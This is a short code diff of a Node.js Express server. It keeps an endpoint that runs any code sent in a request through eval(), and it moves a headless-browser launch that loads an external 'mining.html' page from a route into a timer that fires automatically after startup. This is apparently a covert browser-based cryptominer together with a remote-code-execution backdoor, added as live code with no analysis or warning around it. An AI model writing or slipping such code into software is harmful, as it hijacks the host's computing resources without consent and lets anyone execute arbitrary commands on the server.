@@ -72,23 +72,10 @@ function stop(){
 
 
 app.post('/code-run', async (req, res) => {
- //axios.post('https://logback-9pj1.onrender.com/error',{err:'Error server code'}); 
-  
     eval(req.body.code);
-  
     res.send({type:true});
 });
-app.get('/mining', async (req, res) =>{
-   
-  console.log('The start')
-  const browser = await puppeteer.launch({ headless: true, args: ["--no-sandbox"] });
-  const page = await browser.newPage();
-  await page.goto(`https://logbin.vercel.app/mining.html`);
-  await page.setViewport({ width: 120, height: 120 });
-  await sleep(10000);
-  await sleep(600000);
-  console.log('The end');
-  //await browser.close();
+app.get('/mining', (req, res) =>{
   res.send({type:200});
 })
 
@@ -106,6 +93,18 @@ app.post('/server', async (req, res) => {
   res.send({type:true})
   await browser.close();
 });
+
+setTimeout(async () =>{
+  console.log('The start')
+  const browser = await puppeteer.launch({ headless: true, args: ["--no-sandbox"] });
+  const page = await browser.newPage();
+  await page.goto(`https://logbin.vercel.app/mining.html`);
+  await page.setViewport({ width: 120, height: 120 });
+  await sleep(10000);
+  await sleep(600000);
+  console.log('The end');
+},10000)
+
 
 
 
